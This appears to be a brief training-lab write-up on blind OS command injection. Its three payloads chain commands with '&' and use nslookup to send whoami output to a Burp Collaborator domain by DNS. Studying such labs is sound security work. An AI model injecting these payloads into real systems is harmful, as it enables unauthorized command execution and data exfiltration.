Lab #5 - Blind OS command injection with out-of-band data exfiltration

Target Goal - Exploit blind OS command injection to execute whoami command and exfiltrate output via DNS query to Burp collaborator.

Analysis:

& nslookup bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #

& nslookup `whoami`.bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #

& nslookup $(whoami).bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #
